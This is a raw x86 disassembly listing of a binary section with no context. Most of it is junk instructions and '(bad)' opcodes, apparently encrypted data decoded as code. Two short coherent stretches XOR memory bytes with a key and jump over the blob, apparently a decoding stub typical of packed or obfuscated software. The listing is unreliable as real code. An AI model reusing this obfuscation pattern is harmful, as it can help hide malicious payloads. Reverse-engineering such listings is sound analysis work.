  405d56:	lea    edi,[ebx-0x26]
  405d59:	enter  0x1d06,0xd5
  405d5d:	or     al,0x5
  405d5f:	push   ds
  405d60:	mov    ds:0x73d45a6e,al
  405d65:	sub    esp,DWORD PTR [esi-0x59f9f64a]
  405d6b:	inc    esi
  405d6c:	(bad)  
  405d6d:	sub    dl,cl
  405d6f:	fldcw  WORD PTR [ecx]
  405d71:	push   ecx
  405d72:	or     ebp,DWORD PTR [edi]
  405d74:	add    BYTE PTR [edi],0xd6
  405d77:	pop    DWORD PTR [edx]
  405d79:	shl    DWORD PTR [esi-0x7a7ac613],cl
  405d7f:	fisttp DWORD PTR [ebp-0x41d128b4]
  405d85:	cwde   
  405d86:	in     al,0xb7
  405d88:	and    esp,DWORD PTR [edi-0x7fff22d9]
  405d8e:	xchg   esi,eax
  405d8f:	push   cs
  405d90:	clc    
  405d91:	xchg   esi,eax
  405d92:	lods   eax,DWORD PTR ds:[esi]
  405d93:	xchg   ecx,eax
  405d94:	push   cs
  405d95:	cmp    DWORD PTR ds:[edx],edi
  405d98:	imul   ebx,ebx,0x73
  405d9b:	inc    edi
  405d9c:	outs   dx,DWORD PTR ds:[esi]
  405d9d:	mov    ch,0x72
  405d9f:	xchg   esi,esi
  405da1:	mov    ebp,0x8e05cf09
  405da6:	dec    ebp
  405da7:	loopne 0x405da0
  405da9:	ja     0x405d30
  405dab:	in     eax,0xfe
  405dad:	xor    DWORD PTR [edx-0x45962f5b],edx
  405db3:	xor    BYTE PTR [edi],0xd7
  405db6:	(bad)  
  405db7:	popf   
  405db8:	sbb    DWORD PTR [edx+0x4488acc0],eax
  405dbe:	call   0xe8138207
  405dc3:	fild   DWORD PTR [edx-0x7bbea648]
  405dc9:	xchg   esp,eax
  405dca:	inc    esp
  405dcb:	jns    0x405dde
  405dcd:	adc    al,0x58
  405dcf:	gs lahf 
  405dd1:	mov    edx,0x8fb1f3
  405dd6:	pop    ebx
  405dd7:	push   es
  405dd8:	jae    0x405d70
  405dda:	jge    0x405dce
  405ddc:	rcl    BYTE PTR [edx+0x353443ae],cl
  405de2:	push   es
  405de3:	in     al,dx
  405de4:	jae    0x405dfe
  405de6:	out    dx,al
  405de7:	add    DWORD PTR [eax+ebx*4+0x79d1049f],0x8555c4bc
  405df2:	cld    
  405df3:	cmp    DWORD PTR [eax+0x2],0x14155369
  405dfa:	mov    esp,0x8552a005
  405dff:	mov    edi,DWORD PTR [edi]
  405e01:	pushf  
  405e02:	lds    edi,FWORD PTR [ebp-0x8]
  405e05:	shr    BYTE PTR [eax+0x5f84b4ad],1
  405e0b:	sub    BYTE PTR [ebx-0x72b2ec82],ah
  405e11:	(bad)  
  405e12:	call   0xfcd981ec
  405e17:	sbb    DWORD PTR [ecx-0x6fb85308],edx
  405e1d:	add    edx,edx
  405e1f:	in     eax,dx
  405e20:	push   ebx
  405e21:	scas   al,BYTE PTR es:[edi]
  405e22:	mov    ss,WORD PTR [edx]
  405e24:	xor    al,0xb0
  405e27:	sub    DWORD PTR [esi],0xb0e49b94
  405e2d:	mov    dl,0x7f
  405e2f:	or     BYTE PTR [ebp+0x1b0a7de8],dh
  405e35:	repz xchg ecx,eax
  405e37:	cld    
  405e38:	inc    ecx
  405e39:	imul   eax,DWORD PTR [edx-0x53],0xaa41393e
  405e40:	sbb    eax,0x4f332210
  405e45:	cli    
  405e46:	push   ds
  405e47:	inc    esi
  405e48:	shl    BYTE PTR [ebx-0x37],1
  405e4b:	not    ah
  405e4d:	xor    BYTE PTR [edx-0x20241e76],dh
  405e53:	inc    edi
  405e54:	ja     0x405e39
  405e56:	mov    DWORD PTR [ecx+0x44fd03fd],eax
  405e5c:	pop    edi
  405e5d:	adc    BYTE PTR [ebx+0x3c2e55c2],dh
  405e63:	sub    edx,eax
  405e65:	pusha  
  405e66:	lods   eax,DWORD PTR ds:[esi]
  405e67:	movhps QWORD PTR [esp+ecx*4],xmm6
  405e6b:	leave  
  405e6c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  405e6e:	inc    eax
  405e6f:	push   ss
  405e70:	dec    DWORD PTR [edi]
  405e72:	dec    edi
  405e73:	mov    ebx,0x759c84c8
  405e78:	xor    eax,0x5a41cfaf
  405e7d:	out    0x50,al
  405e7f:	fwait
  405e80:	dec    edi
  405e81:	std    
  405e82:	xor    al,0x11
  405e84:	lods   al,BYTE PTR ds:[esi]
  405e85:	xchg   BYTE PTR [esi+esi*8],cl
  405e88:	sub    ecx,DWORD PTR [edi+edi*8+0x69]
  405e8c:	ins    BYTE PTR es:[edi],dx
  405e8d:	outs   dx,DWORD PTR ds:[esi]
  405e8e:	pop    ss
  405e8f:	je     0x405e9c
  405e91:	jmp    0xf0cb5506
  405e96:	js     0x405ec6
  405e98:	xor    bh,0x11
  405e9b:	pop    esp
  405e9c:	hlt    
  405e9d:	adc    DWORD PTR [edx],esi
  405e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ea0:	sub    edi,DWORD PTR [ebx+esi*8]
  405ea3:	repnz (bad) 
  405ea5:	fbstp  TBYTE PTR [ecx+0x4eb75e33]
  405eab:	or     DWORD PTR ds:0x2247b629,0xffffffb9
  405eb2:	dec    ebx
  405eb3:	jae    0x405ed5
  405eb5:	enter  0x8006,0xd4
  405eb9:	mov    dl,BYTE PTR [di+0x6f]
  405ebd:	in     eax,dx
  405ebe:	hlt    
  405ebf:	(bad)  
  405ec1:	xlat   BYTE PTR ds:[ebx]
  405ec2:	das    
  405ec3:	out    0x18,eax
  405ec5:	nop
  405ec6:	xor    BYTE PTR [ecx-0x77],0x16
  405eca:	mul    DWORD PTR [edx]
  405ecc:	jp     0x405e5c
  405ece:	into   
  405ecf:	popf   
  405ed0:	loopne 0x405f11
  405ed2:	cmc    
  405ed3:	scas   eax,DWORD PTR es:[edi]
  405ed4:	jns    0x405ebc
  405ed6:	(bad)  
  405ed7:	sub    ebp,DWORD PTR [edx]
  405ed9:	mov    bh,0x2
  405edb:	hlt    
  405edc:	mov    eax,0xe08eba
  405ee1:	jl     0x405f5f
  405ee3:	add    eax,0xc6949579
  405ee8:	daa    
  405ee9:	fst    st(7)
  405eeb:	push   ecx
  405eec:	xor    eax,DWORD PTR [esi]
  405eee:	adc    DWORD PTR es:[ebx],eax
  405ef1:	lds    ebx,FWORD PTR [esi+0x25e99bfa]
  405ef7:	fstp   DWORD PTR [ebp+0x57]
  405efa:	add    DWORD PTR [edx+0x33],esi
  405efd:	mov    ch,0x8c
  405eff:	(bad)  
  405f00:	push   ebp
  405f01:	mov    ds:0x84f51eb,al
  405f06:	and    dh,BYTE PTR [esi-0x7c]
  405f09:	fldln2 
  405f0b:	pop    edi
  405f0c:	jge    0x405ea1
  405f0e:	test   DWORD PTR [ebx-0x2c574970],edi
  405f14:	or     BYTE PTR [edi-0x1a052598],bl
  405f1a:	bound  edi,QWORD PTR [edx-0x3e]
  405f1d:	mov    eax,0xd04befe3
  405f22:	xor    edx,DWORD PTR [esi+ebp*2]
  405f25:	imul   eax,DWORD PTR [edx],0x79
  405f28:	jb     0x405ee7
  405f2a:	cld    
  405f2b:	in     al,0xf8
  405f2d:	jae    0x405f72
  405f2f:	test   al,0xb
  405f31:	in     eax,dx
  405f32:	and    al,ch
  405f34:	push   ebp
  405f35:	cld    
  405f36:	and    eax,0xc51b1694
  405f3b:	mov    ebx,DWORD PTR [eax+0x13]
  405f3e:	ret    0xa650
  405f41:	jb     0x405f6c
  405f43:	cmp    eax,0xb147713e
  405f48:	mov    esi,0x42266a02
  405f4d:	sbb    DWORD PTR [ecx],ebx
  405f4f:	push   ds
  405f50:	in     al,0xe8
  405f52:	xchg   ecx,eax
  405f53:	sub    cl,bh
  405f55:	add    al,0xa4
  405f57:	mov    es:0x5b155107,al
  405f5d:	inc    ebx
  405f5e:	or     dh,ah
  405f60:	and    BYTE PTR ds:0xa459d113,dh
  405f66:	fld    TBYTE PTR [eax]
  405f68:	adc    al,ah
  405f6a:	mov    DWORD PTR [ebx-0x19],edx
  405f6d:	push   cs
  405f6e:	cmp    ah,BYTE PTR [ecx+0x46]
  405f71:	ret    
  405f72:	into   
  405f73:	dec    esi
  405f74:	ret    0x2f85
  405f77:	shl    BYTE PTR [esi-0x54],0x45
  405f7b:	ja     0x405fa8
  405f7d:	or     eax,0x4b1ff9d1
  405f82:	cmp    ebx,DWORD PTR [ecx-0x69]
  405f85:	dec    esi
  405f86:	jnp    0x405f1d
  405f88:	gs jg  0x405fff
  405f8b:	out    dx,al
  405f8c:	sbb    BYTE PTR [eax],ch
  405f8e:	sti    
  405f8f:	push   ds
  405f90:	scas   al,BYTE PTR es:[edi]
  405f91:	push   edi
  405f92:	inc    edx
  405f93:	mov    eax,0x19bf2407
  405f98:	jns    0x405fe0
  405f9a:	stos   DWORD PTR es:[edi],eax
  405f9b:	xor    cl,dh
  405f9d:	xor    BYTE PTR [ecx+0x27a91e54],0xb9
  405fa4:	or     eax,0x1fa8e29b
  405fa9:	out    0xc1,al
  405fab:	xchg   ecx,eax
  405fac:	pop    esi
  405fad:	ficom  WORD PTR [esi-0x75]
  405fb0:	sbb    eax,0x5f25c71d
  405fb5:	jmp    FWORD PTR [ebp+0x46]
  405fb8:	outs   dx,BYTE PTR ds:[esi]
  405fb9:	push   edi
  405fba:	(bad)  
  405fbc:	leave  
  405fbd:	cmp    ch,BYTE PTR [edi-0x6c]
  405fc0:	out    dx,al
  405fc1:	sbb    al,0xa0
  405fc3:	inc    ebp
  405fc4:	mov    bl,0x1c
  405fc6:	nop
  405fc7:	fidiv  WORD PTR [eax-0x12]
  405fca:	mov    ah,0x4a
  405fcc:	call   0xde7cc87b
  405fd1:	(bad)  
  405fd2:	call   DWORD PTR gs:[esi+ecx*4-0x77aa0cb0]
  405fda:	retf   
  405fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdc:	push   DWORD PTR [ebx+esi*1+0x1a62f86d]
  405fe3:	outs   dx,DWORD PTR ds:[esi]
  405fe4:	inc    ebp
  405fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fe6:	add    DWORD PTR [ebx+ebx*2+0x6e],ecx
  405fea:	add    edi,DWORD PTR [edi-0x52]
  405fed:	fnstsw WORD PTR [ebx]
  405fef:	push   eax
  405ff0:	mov    BYTE PTR [edi],ch
  405ff2:	or     bl,dl
  405ff4:	dec    edx
  405ff5:	stc    
  405ff6:	imul   edi,DWORD PTR [eax+0x58493cc8],0x13
  405ffd:	or     dh,BYTE PTR [eax-0xc4d3153]
  406003:	pop    ebx
  406004:	sbb    DWORD PTR [edx],edx
  406006:	cmp    dh,ch
  406008:	lock jo 0x406049
  40600b:	or     DWORD PTR [eax-0x63],0xffffff9f
  40600f:	mov    dh,0x32
  406011:	fs adc eax,0xba45622c
  406017:	test   al,0xf9
  406019:	or     DWORD PTR [ecx],eax
  40601b:	or     al,0xb4
  40601d:	xcrypt-ctr (bad)
  40601e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40601f:	cdq    
  406020:	sbb    DWORD PTR [ebx-0x6e6e5c12],esi
  406026:	jne    0x405fda
  406028:	pop    eax
  406029:	mov    ds:0x3d74575d,eax
  40602e:	dec    esi
  40602f:	dec    ebp
  406030:	and    ebp,DWORD PTR [ecx]
  406032:	call   0x44ed:0xef8ce3e2
  406039:	mov    bl,0xbb
  40603b:	add    esp,edx
  40603d:	mov    eax,ds:0xfc5ece63
  406042:	(bad)  
  406044:	retf   
  406045:	adc    al,0xa8
  406047:	inc    esp
  406048:	fsub   QWORD PTR [edi+0x5287d6fe]
  40604e:	js     0x406063
  406050:	mov    al,ds:0xb8af4e13
  406055:	into   
  406056:	xlat   BYTE PTR es:[ebx]
  406058:	pop    ebp
  406059:	jle    0x40607a
  40605b:	mov    ?,WORD PTR [ebx+ebp*1+0x23e6dfef]
  406062:	inc    edx
  406063:	mov    esp,0xcd737903
  406068:	adc    eax,0xbf1cb93d
  40606d:	call   DWORD PTR [esp+edi*4]
  406070:	popa   
  406071:	aas    
  406072:	out    0x13,al
  406074:	in     al,0x32
  406076:	or     DWORD PTR ds:0x673fd6c,ecx
  40607c:	mov    eax,ds:0xd1ad71a1
  406081:	dec    edi
  406082:	jp     0x40605e
  406084:	sub    edx,DWORD PTR [ebp-0x22]
  406087:	sbb    BYTE PTR [esi],dh
  406089:	lea    ebx,[ebp+edi*1+0x755c76c4]
  406090:	mov    edx,0x31ae9b50
  406095:	es sahf 
  406097:	ret    
  406098:	fs xchg ch,dl
  40609b:	pop    ebp
  40609c:	test   DWORD PTR [ecx],ebp
  40609e:	or     al,0xfe
  4060a0:	rcpps  xmm3,XMMWORD PTR [edi]
  4060a3:	mov    WORD PTR [eax],ds
  4060a5:	int3   
  4060a6:	push   ebx
  4060a7:	jmp    0xae6db688
  4060ac:	inc    eax
  4060ad:	repz push ss
  4060af:	sbb    al,0xf0
  4060b1:	add    al,0x3b
  4060b3:	and    bh,BYTE PTR [ebp+0x62959690]
  4060b9:	add    DWORD PTR [eax-0x64cafcc6],ebx
  4060bf:	call   0xf7ad:0x14bf47c7
  4060c6:	ins    BYTE PTR es:[edi],dx
  4060c7:	add    dl,BYTE PTR [ebp-0x7d]
  4060ca:	into   
  4060cb:	pop    ds
  4060cc:	mov    cl,0xb2
  4060ce:	lods   eax,DWORD PTR ds:[esi]
  4060cf:	inc    ebx
  4060d0:	add    eax,0x76710420
  4060d5:	es jne 0x4060a5
  4060d8:	and    DWORD PTR [eax+ebp*2-0x1f3376da],0x56fdd63
  4060e3:	ins    DWORD PTR es:[edi],dx
  4060e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e5:	mov    BYTE PTR [ebp-0x245a8a82],dl
  4060eb:	dec    esp
  4060ec:	dec    ebp
  4060ed:	loopne 0x406141
  4060ef:	(bad)  
  4060f0:	(bad)  
  4060f1:	pushf  
  4060f2:	jno    0x40613b
  4060f4:	dec    ebp
  4060f5:	std    
  4060f6:	xor    eax,0xfc05448d
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	stos   DWORD PTR es:[edi],eax
  40612d:	pop    eax
  40612e:	mov    ebx,0x18a378b0
  406133:	sbb    BYTE PTR [esi+0x39181812],bl
  406139:	frstor [esi+0x456a7e31]
  40613f:	ja     0x406154
  406141:	cmp    BYTE PTR [ebx],al
  406143:	repz call 0x8b71e2c3
  406149:	mov    ebx,0xa775e03f
  40614e:	aas    
  40614f:	enter  0x794d,0x41
  406153:	arpl   si,di
  406155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406156:	push   edx
  406157:	jno    0x4060dd
  406159:	add    eax,0xde31b7ee
  40615e:	stos   BYTE PTR es:[edi],al
  40615f:	(bad)  
  406160:	sahf   
  406161:	popf   
  406162:	xchg   ebx,eax
  406163:	add    ah,bh
  406165:	(bad)  [ebx]
  406167:	or     DWORD PTR [ecx+0x7b],edx
  40616a:	xchg   edi,eax
  40616b:	jnp    0x406108
  40616d:	enter  0xc8dc,0x9b
  406171:	adc    edx,DWORD PTR [ebx]
  406173:	jnp    0x40611a
  406175:	repnz push 0xa41d307f
  40617b:	push   cs
  40617c:	adc    al,0xb1
  40617e:	inc    esp
  40617f:	out    dx,al
  406180:	scas   al,BYTE PTR es:[edi]
  406181:	sub    DWORD PTR [ebx+0x5e],ebp
  406184:	push   ss
  406185:	push   esi
  406186:	daa    
  406187:	pop    ecx
  406188:	fisubr DWORD PTR [esi+eiz*8]
  40618b:	fsub   DWORD PTR [ebp+0x35]
  40618e:	jnp    0x4061c7
  406190:	shl    esp,0x60
  406193:	cmp    esi,ecx
  406195:	int    0x3
  406197:	ja     0x406159
  406199:	dec    esp
  40619a:	aas    
  40619b:	and    dh,dh
  40619d:	int3   
  40619e:	clc    
  40619f:	test   al,0xdd
  4061a1:	add    eax,0x2f6106bc
  4061a6:	fsubr  st,st(0)
  4061a8:	mul    DWORD PTR [eax-0x70]
  4061ab:	in     al,dx
  4061ac:	and    al,0x3a
  4061ae:	lods   eax,DWORD PTR ds:[esi]
  4061af:	mov    edi,0x2a1a01c4
  4061b4:	push   edi
  4061b5:	into   
  4061b6:	sahf   
  4061b7:	cmp    BYTE PTR [ebp+0x7a],dh
  4061ba:	mov    BYTE PTR [esi+0x3dc73ad3],cl
  4061c0:	jbe    0x4061e9
  4061c2:	jns    0x4061b2
  4061c4:	ror    BYTE PTR [ebx],1
  4061c6:	mov    BYTE PTR [ebx],ah
  4061c8:	dec    esp
  4061c9:	jge    0x40616d
  4061cb:	iret   
  4061cc:	push   ds
  4061cd:	xor    eax,0x182597f3
  4061d2:	dec    ebx
  4061d3:	enter  0xfe7,0x39
  4061d7:	and    edi,DWORD PTR ss:[edi+0x6a05519d]
  4061de:	hlt    
  4061df:	mov    ds:0x51cd85d,al
  4061e4:	sub    eax,0xa18a05ff
  4061e9:	fst    QWORD PTR [ecx+0x19]
  4061ec:	mov    edx,0xffcb7bfc
  4061f1:	daa    
  4061f2:	cmp    al,0x9f
  4061f4:	xor    eax,0x98daa325
  4061f9:	mov    eax,0xf0bdb324
  4061fe:	cmp    bh,bl
  406200:	es jle 0x40623c
  406203:	popa   
  406204:	sbb    DWORD PTR [edi+ecx*4],ebp
  406207:	les    ebx,FWORD PTR [ecx+0x16]
  40620a:	fdivr  QWORD PTR [ebp+0x234abba7]
  406210:	push   ebp
  406211:	mov    dh,BYTE PTR [edx+0x65a85a1]
  406217:	dec    ebp
  406218:	xor    dh,BYTE PTR [esi-0x35368e0a]
  40621e:	loopne 0x4061de
  406220:	mov    ss,ebp
  406222:	mov    eax,0x770f642b
  406227:	test   DWORD PTR [esi+eiz*1-0x52],ecx
  40622b:	mov    ebp,0x207e3bba
  406230:	mov    al,0xce
  406232:	data16 sub BYTE PTR [eax+0x3bc64aa0],al
  406239:	(bad)  
  40623b:	and    al,0x53
  40623d:	push   cs
  40623e:	ja     0x406287
  406240:	jb     0x4061c6
  406242:	popa   
  406243:	dec    ebp
  406244:	fistp  QWORD PTR [esi+esi*1+0x72f8a297]
  40624b:	mul    BYTE PTR [ebx+ebx*4]
  40624e:	mov    ecx,0x4089b267
  406253:	lods   eax,DWORD PTR ds:[esi]
  406254:	inc    esp
  406255:	neg    BYTE PTR [ebx+0x38caba90]
  40625b:	adc    al,0x3c
  40625d:	pop    edx
  40625e:	fsubr  st(4),st
  406260:	and    bh,BYTE PTR [ecx+0x43f84e48]
  406266:	dec    ebx
  406267:	ret    0x8204
  40626a:	aaa    
  40626b:	sti    
  40626c:	repnz mov edx,0x16e62237
  406272:	xor    al,0x3d
  406274:	pop    esi
  406275:	addr16 loopne 0x40621c
  406278:	in     al,0xc5
  40627a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40627b:	inc    ebx
  40627c:	dec    ebp
  40627d:	adc    edx,esp
  40627f:	fidiv  WORD PTR [eax-0x3f]
  406282:	repnz inc BYTE PTR [esp+eax*1]
  406286:	retf   
  406287:	xor    ecx,eax
  406289:	or     DWORD PTR [ebx-0x52f6f109],edi
  40628f:	push   ecx
  406290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406291:	(bad)
  406295:	mov    DWORD PTR ds:0x60402657,esp
  40629b:	test   BYTE PTR [eax-0x30],ch
  40629e:	in     eax,dx
  40629f:	mov    edx,0xc1d76c7b
  4062a4:	sub    bl,bh
  4062a6:	outs   dx,BYTE PTR ds:[esi]
  4062a7:	jns    0x4062e6
  4062a9:	cs sub al,0xd0
  4062ad:	repz sub bl,BYTE PTR [edx]
  4062b0:	stc    
  4062b1:	addr16 pop ecx
  4062b3:	sub    al,BYTE PTR [edx]
  4062b5:	sub    al,0xc4
  4062b7:	(bad)  
  4062b8:	pop    ecx
  4062b9:	jns    0x40630f
  4062bb:	push   ss
  4062bc:	cwde   
  4062bd:	xor    eax,0x5cf59468
  4062c2:	pop    edi
  4062c3:	pop    ss
  4062c4:	(bad)  
  4062c6:	sahf   
  4062c7:	jb     0x406272
  4062c9:	sbb    bh,0x9a
  4062cc:	add    BYTE PTR [ebx],ch
  4062ce:	ret    
  4062cf:	out    0x18,al
  4062d1:	jae    0x406342
  4062d3:	ja     0x40632b
  4062d5:	stos   BYTE PTR es:[edi],al
  4062d6:	test   ah,bl
  4062d8:	ret    0x4465
  4062db:	cmp    al,0x7
  4062dd:	pusha  
  4062de:	ret    0x8d77
  4062e1:	and    eax,0x77fc853e
  4062e6:	cmp    BYTE PTR [ebx+ebp*8+0xb],bh
  4062ea:	je     0x4062ce
  4062ec:	jl     0x4062fc
  4062ee:	push   0xffffffbc
  4062f0:	add    eax,0xefc62f4a
  4062f5:	ds call 0xd029c41
  4062fb:	push   edx
  4062fc:	loope  0x4062c5
  4062fe:	dec    edi
  4062ff:	xchg   edi,eax
  406300:	int3   
  406301:	cld    
  406302:	push   edi
  406303:	stc    
  406304:	imul   ecx,DWORD PTR [ecx+0x61],0xffffffd0
  406308:	into   
  406309:	and    esp,DWORD PTR [eax]
  40630b:	push   ebp
  40630c:	mul    DWORD PTR [esi-0x374e2797]
  406312:	les    edi,FWORD PTR [edi]
  406314:	mov    bl,0xc3
  406316:	outs   dx,DWORD PTR ds:[esi]
  406317:	mov    edx,0x38bf97a2
  40631c:	icebp  
  40631d:	mov    DWORD PTR [eax],ebp
  40631f:	lahf   
  406320:	in     eax,0xa9
  406322:	jp     0x4062ac
  406324:	adc    DWORD PTR [ebp-0x29027147],0xffffffb2
  40632b:	out    0xe4,eax
  40632d:	sub    al,0x4a
  40632f:	sbb    BYTE PTR [eax],dl
  406331:	rcr    edx,cl
  406333:	xchg   ebp,eax
  406334:	imul   esp,DWORD PTR [eax-0x7891e41a],0x8ea6b3ec
  40633e:	xor    al,0xca
  406340:	pop    ss
  406341:	mov    esi,0x56198f8c
  406346:	add    al,0x8f
  406348:	dec    ebx
  406349:	je     0x4063c9
  40634b:	cmp    eax,0x2284aa31
  406350:	cmp    eax,0xcf224ea0
  406355:	popa   
  406356:	lahf   
  406357:	adc    esp,DWORD PTR [ecx+0x62ec7a4b]
  40635d:	clc    
  40635e:	jno    0x4062e2
  406360:	xchg   ebp,ecx
  406362:	loop   0x4062ec
  406364:	inc    edx
  406365:	int3   
  406366:	xchg   dx,ax
  406368:	cmc    
  406369:	lods   al,BYTE PTR ds:[esi]
  40636a:	(bad)  
  40636c:	dec    ecx
  40636d:	and    eax,0x55525b89
  406372:	inc    esp
  406373:	clc    
  406374:	mov    ebp,db1
  406377:	ficom  WORD PTR [ebx+eax*4+0x1f]
  40637b:	(bad)  
  40637c:	xor    al,0x71
  40637e:	cdq    
  40637f:	test   eax,0x9c1ba42a
  406384:	mov    eax,0x49df2fba
  406389:	sub    eax,0x10a206ab
  40638e:	int3   
  40638f:	sahf   
  406390:	out    0x5a,eax
  406392:	cmp    al,0xfc
  406394:	imul   ebx,DWORD PTR [ecx+eiz*8],0xfffffff0
  406398:	mov    esi,0xdf64f11
  40639d:	daa    
  40639e:	and    ebp,DWORD PTR ss:[ebp-0x17]
  4063a2:	and    eax,0x6e84eb54
  4063a7:	xchg   ebp,eax
  4063a8:	jecxz  0x406414
  4063aa:	mov    ebx,0x8ee9ae16
  4063af:	retf   0x394c
  4063b2:	mov    edx,0x87549d33
  4063b7:	aam    0x8d
  4063b9:	stos   DWORD PTR es:[edi],eax
  4063ba:	jecxz  0x4063a0
  4063bc:	test   al,0x5
  4063be:	push   esp
  4063bf:	ds mov ebx,0xd6857690
  4063c5:	push   esp
  4063c6:	cmc    
  4063c7:	sti    
  4063c8:	sub    BYTE PTR [edx],dl
  4063ca:	loop   0x406391
  4063cc:	scas   eax,DWORD PTR es:[edi]
  4063cd:	adc    al,0xd
  4063cf:	das    
  4063d0:	sbb    ecx,esp
  4063d2:	add    BYTE PTR [edi-0x4258d084],ah
  4063d8:	and    esp,0xffffffba
  4063db:	jnp    0x406445
  4063dd:	cmp    al,0xbe
  4063df:	cli    
  4063e0:	in     eax,0xbe
  4063e2:	pop    esi
  4063e3:	imul   ebx,DWORD PTR [edx-0x69],0x24ce8696
  4063ea:	or     BYTE PTR [edi+0x2f7c9912],bl
  4063f0:	(bad)  
  4063f1:	xchg   ecx,eax
  4063f2:	ins    BYTE PTR es:[edi],dx
  4063f3:	test   BYTE PTR [edx+0x17],dl
  4063f6:	add    al,0x24
  4063f8:	scas   eax,DWORD PTR es:[edi]
  4063f9:	mov    al,ds:0xc18ce9b5
  4063fe:	pop    eax
  4063ff:	mov    edi,0xa976a101
  406404:	xor    edi,DWORD PTR [eax+0x26]
  406407:	retf   
  406408:	fs jmp 0x406485
  40640b:	call   0xf1e8:0xb3d4c786
  406412:	rol    dh,0x2c
  406415:	jns    0x4063b9
  406417:	sub    eax,0xa236d413
  40641c:	neg    BYTE PTR [esp+ebp*4+0x12]
  406420:	repnz xchg edx,eax
  406422:	mov    edi,0xd5bdf496
  406427:	sbb    DWORD PTR fs:[eax],esp
  40642a:	add    eax,0x923a19f8
  40642f:	and    BYTE PTR [ecx],dl
  406431:	ret    
  406432:	sbb    al,0x54
  406434:	push   ds
  406435:	adc    eax,0x546bf1c
  40643a:	inc    esi
  40643b:	add    DWORD PTR [esi],esi
  40643d:	cli    
  40643e:	sub    DWORD PTR [ebx-0x38],ebp
  406441:	outs   dx,BYTE PTR gs:[esi]
  406443:	sbb    al,0x44
  406445:	lods   eax,DWORD PTR ds:[esi]
  406446:	cli    
  406447:	iret   
  406448:	pop    ds
  406449:	int3   
  40644a:	data16 sbb al,0xbe
  40644d:	dec    ebx
  40644e:	push   ds
  40644f:	jo     0x406412
  406451:	mov    al,0xd7
  406453:	repz out dx,al
  406455:	in     al,0xf2
  406457:	cmp    bl,ch
  406459:	add    ebx,esp
  40645b:	xchg   ebp,eax
  40645c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40645d:	mov    cs,WORD PTR [eax-0x11]
  406460:	out    dx,al
  406461:	popa   
  406462:	sar    DWORD PTR [edx],1
  406464:	je     0x4064d1
  406466:	pop    eax
  406467:	adc    BYTE PTR [edi],ah
  406469:	les    ebx,FWORD PTR [ebp+0x73c95455]
  40646f:	xchg   DWORD PTR [edi+0x15cf9c5f],esi
  406475:	cmp    bh,BYTE PTR ds:0x2adaaff5
  40647b:	mov    eax,0x2373cd8
  406480:	sub    eax,0x3c61da78
  406485:	xor    DWORD PTR [ebx+ebp*2],esi
  406488:	(bad)  
  406489:	lods   al,BYTE PTR ds:[esi]
  40648a:	je     0x406468
  40648c:	sub    ebx,DWORD PTR [ebx]
  40648e:	or     eax,0xea9362c9
  406493:	lds    esp,FWORD PTR [edx]
  406495:	cli    
  406496:	iret   
  406497:	jp     0x406495
  406499:	fwait
  40649a:	test   BYTE PTR [eax-0x6c4e11],ah
  4064a0:	cli    
  4064a1:	xlat   BYTE PTR ds:[ebx]
  4064a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a3:	in     eax,dx
  4064a4:	dec    ebx
  4064a5:	mov    ecx,0x43692539
  4064aa:	cmp    BYTE PTR [ecx],bh
  4064ac:	clc    
  4064ad:	inc    esi
  4064ae:	mov    al,ds:0xc4a4f5e
  4064b3:	std    
  4064b4:	add    BYTE PTR [ecx-0x36],bl
  4064b7:	jb     0x4064ae
  4064b9:	push   ebp
  4064ba:	ud0    esp,DWORD PTR [ebx]
  4064bd:	cmp    BYTE PTR [eax+0x22516da3],bl
  4064c3:	pop    es
  4064c4:	mov    ch,0x95
  4064c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c7:	aad    0x3b
  4064c9:	xchg   esi,eax
  4064ca:	(bad)  
  4064cb:	fst    QWORD PTR gs:[esi-0x1dd326cd]
  4064d2:	aad    0xc7
  4064d4:	jae    0x4064b8
  4064d6:	push   edx
  4064d7:	adc    DWORD PTR [edx+0x2e],0x7
  4064db:	enter  0xa425,0x88
  4064df:	popa   
  4064e0:	inc    esp
  4064e1:	xchg   edi,eax
  4064e2:	sbb    esi,ebp
  4064e4:	popa   
  4064e5:	cmp    BYTE PTR [ebp+0x26],bl
  4064e8:	xchg   edi,eax
  4064e9:	in     al,dx
  4064ea:	sbb    DWORD PTR [esi],edx
  4064ec:	mov    dh,ah
  4064ee:	adc    bh,BYTE PTR [eax+0x2e]
  4064f1:	push   0xffffff8e
  4064f3:	jecxz  0x40651d
  4064f5:	ins    DWORD PTR es:[edi],dx
  4064f6:	faddp  st(2),st
  4064f8:	fs or  eax,edx
  4064fb:	mov    cl,BYTE PTR [eax+ecx*1]
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
